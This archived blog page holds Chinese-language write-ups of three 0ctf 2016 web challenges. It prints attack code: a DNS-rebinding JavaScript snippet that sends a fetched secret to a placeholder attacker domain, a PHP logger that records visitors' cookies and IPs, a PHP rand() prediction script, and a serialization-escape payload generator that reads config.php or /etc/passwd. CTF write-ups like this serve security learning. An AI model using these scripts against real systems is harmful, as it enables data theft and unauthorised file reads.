<!DOCTYPE html>
<html><head><base href="https://www.virzz.com"/><meta charset="utf-8"/><meta content="chrome=1" http-equiv="X-UA-Compatible"/><title> 0ctf 2016 部分 web writeup | Virink's Blog</title><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/><meta content="Virink" name="author"/><meta content="monkey
折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊
域名解析商
根据页面提示 $str so that (substr(md5($str), 0, 6) === 'c1da58')，果断跑数字，成功爆破，最后确定为7-9位左右
再根据提示What is Same Origin Policy?，明显的同源策略
先来一发ajax获取数据：
js.php or" name="description"/><meta content="article" property="og:type"/><meta content="0ctf 2016 部分 web writeup | Virink's Blog" property="og:title"/><meta content="https://www.virzz.com/2016/03/14/0ctf 2016 部分 web writeup.html" property="og:url"/><meta content="Virink's Blog" property="og:site_name"/><meta content="monkey
折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊
域名解析商
根据页面提示 $str so that (substr(md5($str), 0, 6) === 'c1da58')，果断跑数字，成功爆破，最后确定为7-9位左右
再根据提示What is Same Origin Policy?，明显的同源策略
先来一发ajax获取数据：
js.php or" property="og:description"/><meta content="2016-12-12T04:39:49.000Z" property="og:updated_time"/><meta content="summary" name="twitter:card"/><meta content="0ctf 2016 部分 web writeup | Virink's Blog" name="twitter:title"/><meta content="monkey
折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊
域名解析商
根据页面提示 $str so that (substr(md5($str), 0, 6) === 'c1da58')，果断跑数字，成功爆破，最后确定为7-9位左右
再根据提示What is Same Origin Policy?，明显的同源策略
先来一发ajax获取数据：
js.php or" name="twitter:description"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/favicon.ico" rel="icon" type="image/x-icon"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/favicon.ico" rel="icon"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/font-awesome.min.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/uno.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/tagscloud.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/links.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/archive.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/jquery.fancybox.css" rel="stylesheet"/><link href="./ 0ctf 2016 部分 web writeup  Virink's Blog/monokai-sublime.min.css" rel="stylesheet"/><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/highlight.min.js"></script></head><body><span class="mobile btn-mobile-menu"><i aria-hidden="true" class="fa btn-mobile-menu__icon fa-bars"></i></span><header class="panel-cover panel-cover--collapsed"><div class="panel-main"><div class="panel-main__inner panel-inverted"><div class="panel-main__content"> <a href="/" title="link to homepage for Virink's Blog"><img alt="Virink's Blog logo" class="panel-cover__logo logo" src="./ 0ctf 2016 部分 web writeup  Virink's Blog/avatar.png" width="80"/></a><h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Virink</a></h1><hr class="panel-cover__divider"/><p class="panel-cover__description"> 探索技術，追求超越。</p><hr class="panel-cover__divider"/><div id="tagscloud"> <a class="tagc1" href="/tags/ctf/">ctf : 13</a><a class="tagc2" href="/tags/php/">php : 11</a><a class="tagc3" href="/tags/writeups/">writeups : 11</a><a class="tagc4" href="/tags/web/">web : 6</a><a class="tagc5" href="/tags/mac/">mac : 4</a><a class="tagc1" href="/tags/thinking/">thinking : 3</a><a class="tagc2" href="/tags/audit/">audit : 3</a><a class="tagc3" href="/tags/linux/">linux : 2</a><a class="tagc4" href="/tags/python/">python : 2</a><a class="tagc5" href="/tags/flask/">flask : 2</a><a class="tagc1" href="/tags/shell/">shell : 2</a><a class="tagc2" href="/tags/ssh/">ssh : 2</a><a class="tagc3" href="/tags/osx/">osx : 1</a><a class="tagc4" href="/tags/mongodb/">mongodb : 1</a><a class="tagc5" href="/tags/debug/">debug : 1</a><a class="tagc1" href="/tags/app/">app : 1</a><a class="tagc2" href="/tags/leanote/">leanote : 1</a><a class="tagc3" href="/tags/go/">go : 1</a><a class="tagc4" href="/tags/mysql/">mysql : 1</a><a class="tagc5" href="/tags/mariadb/">mariadb : 1</a></div><div class="navigation-wrapper"><nav class="cover-navigation cover-navigation--primary"><ul class="navigation"><li class="navigation__item"><a class="blog-button" href="/#blog" title="">博客</a></li><li class="navigation__item"><a class="" href="/archive/" title="">歸檔</a></li><li class="navigation__item"><a class="" href="/links/" title="">友鏈</a></li><li class="navigation__item"><a class="" href="/about/" title="">關於</a></li><li class="navigation__item"><a class="" href="/feed.xml" title="">訂閱</a></li></ul></nav><hr class="panel-cover__divider"/><nav class="cover-navigation navigation--social"><ul class="navigation"><li class="navigation__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="navigation__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="navigation__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></ul></nav></div></div></div><div class="panel-cover--overlay"></div></div></header><div class="content-wrapper"><div class="content-wrapper__inner entry"><article class="post-container post-container--single"><header class="post-header"><h1 class="post-title">0ctf 2016 部分 web writeup</h1><div class="post-meta"> <time class="post-meta__date date" datetime="2016-03-14 06:49:32">2016-03-14 06:49:32</time> <span class="post-meta__tags tags">• 標籤: <font class="tags"><a class="tags-link" href="/tags/ctf/">ctf</a>, <a class="tags-link" href="/tags/writeups/">writeups</a></font></span></div></header><section class="article-content post" id="post-content"><h2>monkey</h2><p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p><p><a href="http://www.cloudxns.net/" rel="external" target="_blank" title="http://www.cloudxns.net/">域名解析商</a></p><p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === 'c1da58')</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p><p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p><p>先来一发ajax获取数据：</p><h3>js.php or js.html</h3><pre><code>&lt;script src="jquery.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
function getdata(){
	$.ajax({
		type: "GET",
		url:'http://xxx.com:8080/secret',
		async: true,
		error: function(request) {
			getdata();
		},
		success: function(data) {
			$.get('http://yourdomain/get.php?data='+data);
		}
	});
}
getdata();
&lt;/script&gt;
</code></pre><p>再来一发get.php:</p><pre><code>&lt;?php
	$data = "get : ".urldecode(urldecode($_SERVER['QUERY_STRING']));
	$data .= "\r\npost : ".urldecode(urldecode(file_get_contents("php://input")));
	$data .= "\r\nip : ".$_SERVER["REMOTE_ADDR"];
	$data .= "\r\nREFERER : ".$_SERVER['HTTP_REFERER'];
	$data .= "\r\nHTTP_USER_AGENT : ".$_SERVER['HTTP_USER_AGENT'];
	$data .= "\r\nREQUEST_METHOD : ".$_SERVER['REQUEST_METHOD'];
	$data .= "\r\nCookies : ".implode(' ',$_COOKIES);
	if(strlen($data)&gt;10){
		file_put_contents("get.txt","### ".date("Y-m-d H:m:s")." ###\r\n".$data."\r\n", FILE_APPEND);
	}
?&gt;
</code></pre><p>最后来一发自动爆破并提交的py：</p><h3>monkey_poc.py</h3><pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

import md5
import os
import re
import time
import requests

def mx(str):
	m1 = md5.new()   
	m1.update(str)   
	return m1.hexdigest()

if __name__ == '__main__':
	r = requests.session()
	print 'start'
	g = r.get("http://202.120.7.200/index.php")
	m = re.search(r'\(substr\(md5\(\$str\), 0, 6\) === \'([1|2|3|4|5|6|7|8|9|0|a|b|c|d|e|f]{6})\'\)', g.content).group(1)
	print 'fucking ' + m
	for x in range(10000000,100000000):
		a = mx(str(x))[0:6]
		if a == m:
			print 'get string: ' + str(x)
			_data = {"task":str(x), "url":"http://xxx.com:8080/fuck.php?a="+str(x)}
			b = r.post("http://202.120.7.200/run.php",data=_data)
			print b.content
			break
	time.sleep(3)
	i = 120  
	while i:
		if i == 110:
			print ' Please change you dns'
		else:
			print i
		i = i-1
		time.sleep(1)
	print 'end'
</code></pre><p>拿起你的域名、、、找一个牛X的dns解析提供商</p><p>运行poc后，根据提示把域名A记录改为127.0.0.1</p><p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p><p>拼手速+网速的时候到了</p><h2>rand_2</h2><p>题目源码</p><pre><code>&lt;?php
include('config.php');
session_start();

if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
    session_destroy();
    die('timeout');
} else {
    $_SESSION['time'] = time();
}

echo rand();
if (isset($_GET['go'])) {
    $_SESSION['rand'] = array();
    $i = 5;
    $d = '';
    while($i--){
        $r = (string)rand();
        $_SESSION['rand'][] = $r;
        $d .= $r;
    }
    echo md5($d);
} else if (isset($_GET['check'])) {
    if ($_GET['check'] === $_SESSION['rand']) {
        echo $flag;
    } else {
        echo 'die';
        session_destroy();
    }
} else {
    show_source(__FILE__);
}
</code></pre><p>由于**$_GET['check'] === $_SESSION['rand']<strong>是</strong>===全等类型**判断，目测无法绕过、脑洞必然在rand()</p><p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p><p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" rel="external" target="_blank" title="随机数产生原理">随机数产生原理</a></p><p>队友写的POC</p><h3>rand_2_poc.py</h3><pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

import requests

while True:
	r = requests.session()
	l = []
	# 获取50个随机rand值并存入list
	for i in range(50):
		response = r.get('http://202.120.7.202:8888/')
		l.append(int(response.content[:response.content.find('&lt;')]))
	#将$_SESSION['rand']这个数组写满5个随机数
	response = r.get('http://202.120.7.202:8888/?go')
	#获取将MD5之前的rand随机数存到list
	l.append(int(response.content[:-32]))
	url = 'http://202.120.7.202:8888/?'
	for i in range(5):
		end = len(l)
		#由随机数生成算法预测下一个随机数
		randNUM = (l[end-3]+l[end-31]) % 2147483648 
		l.append(randNUM)#将新生成的也加入到列表里
		#构造url 传入数组5个预测rand随机数
		url += 'check[]={}&amp;'.format(randNUM)
	response = r.get(url)#GET请求url 同时传入参数
	#如果输出不是 die 大功告成
	if 'die' not in response.content:
		print response.content
		break
</code></pre><h2>piapiapia</h2><p>下载源码、通读一遍。</p><p>大概可以知道这题的脑洞在于是更新个人资料。</p><p>并且，<strong>flag是在config.php中！</strong></p><p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p><pre><code>public function filter($string) {
	$escape = array('\'', '\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);
	$safe = array('select', 'insert', 'update', 'delete', 'where');
	$safe = '/' . implode('|', $safe) . '/i';
	return preg_replace($safe, 'hacker', $string);
}
</code></pre><p><strong>可以知道'和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p><pre><code>public function update_profile($username, $new_profile) {
	$username = parent::filter($username);
	$new_profile = parent::filter($new_profile);
	$where = "username = '$username'";
	return parent::update($this-&gt;table, 'profile', $new_profile, $where);
}
</code></pre><p><strong>所更新的资料都是被filter()过滤后的。</strong></p><p>在update.php中</p><pre><code>$user-&gt;update_profile($username, serialize($profile));
</code></pre><p><strong>更新的profile是警告序列化转换的。</strong></p><p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p><pre><code>if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10){
	die('Invalid nickname');
}
</code></pre><p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
返回值
preg_match()返回 pattern 的匹配次数。 	它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
如果发生错误preg_match()返回 FALSE。
</code></pre><p><strong>如果发生错误preg_match()返回 FALSE。</strong></p><p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p><p>我们提交nickname[]=xxx可以得到序列化语句：</p><pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre><p>根据PHP **unserialize()**的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p><pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}')
</code></pre><p>等价于</p><pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}xxxxxxxxxxxxxxxx')
</code></pre><p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p><pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre><p>但是，我们提交的nickname[]=xxx";}s:5:"photo";s:10:"config.php的时候，却是会得到：</p><pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre><p>即</p><pre><code>a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}
</code></pre><p>我们需要逃逸**";}s:5:"photo";s:10:"config.php**这31个字符</p><p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p><p>当 'where'*n+'";}s:5:"photo";s:10:"config.php' == 'hacker'*n 的时候，就可以成功逃逸</p><p>得到playload：</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php
</code></pre><h3>piapiapia_poc.py</h3><pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

def getflag():
	playload = '";}s:5:"photo";s:10:"config.php'
	w = 'where'
	h = 'hacker'
	for i in range(100):
		if len(w*i +playload) == len(h*i):
			print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
			break

def getpasswd():
	playload = '";}s:5:"photo";s:11:"/etc/passwd'
	w = 'where'
	h = 'hacker'
	for i in range(100):
		if len(w*i +playload) == len(h*i):
			print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
			break

def getany(f):
	playload = '";}s:5:"photo";s:'+str(len(f))+':"'+f
	w = 'where'
	h = 'hacker'
	for i in range(100):
		if len(w*i +playload) == len(h*i):
			print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
			break
	update(w*i +playload)

if __name__ == '__main__':
	print 'get flag playload:\r\n'
	getflag()
	print 'get /ect/passwd playload:\r\n'
	getpasswd()
	f = raw_input("Input filepath what your want to read:")
	getany(f)
</code></pre></section><div class="copyright"> <span>文本標題:</span><a href="/2016/03/14/0ctf 2016 部分 web writeup.html" target="_blank">0ctf 2016 部分 web writeup</a><br/> <span>文章作者:</span><a href="/" target="_blank" title="回到主頁">Virink</a><br/> <span>發佈時間:</span>2016-03-14 06:49:32<br/> <span>最後更新:</span>2016-12-12 12:39:49<br/> <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/03/14/0ctf 2016 部分 web writeup.html" target="_blank" title="0ctf 2016 部分 web writeup">https://www.virzz.com/2016/03/14/0ctf 2016 部分 web writeup.html</a><br/> <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。</div></article><footer class="footer"><center> <span class="footer__copyright">© 2016-2017. | ❤ <a href="mailto:virink@outlook.com">Virink</a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span> <span>本站採用<i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div></div><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/jquery.min.js"></script><script>!window.jQuery&&document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/main.js"></script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/scale.fix.js"></script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/tagcloud.js"></script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/jquery.fancybox.js"></script><script type="text/javascript">$(document).ready(function(){$(".fancybox").fancybox({padding:0,helpers:{overlay:{locked:!1}}})})</script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script><script type="text/javascript">$(document).ready(function(){MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/highlight.min.js"></script><script src="./ 0ctf 2016 部分 web writeup  Virink's Blog/gallery.js"></script><script>$(document).ready(function(){hljs.initHighlightingOnLoad()})</script><div id="totop" style="position:fixed;bottom:50px;right:30px;cursor:pointer;opacity:1"> <a title="back to top"><img src="./ 0ctf 2016 部分 web writeup  Virink's Blog/totop.png" style="width:30px;height:30px"/></a></div><script>!function(o){var t=o("#totop");t.hide(),o(window).scroll(function(){o(document).scrollTop()>100?o(t).stop().fadeTo(300,1):o(t).stop().fadeTo(300,0)}),o(t).click(function(){return o("html, body").animate({scrollTop:0},500),!1})}(jQuery)</script><script>!function(e,t,a,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=t.createElement(a),s=t.getElementsByTagName(a)[0],o.async=1,o.src="https://www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-83885261-1","auto"),ga("send","pageview")</script> <!--[if IE 6]><script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script><![endif]--></body></html>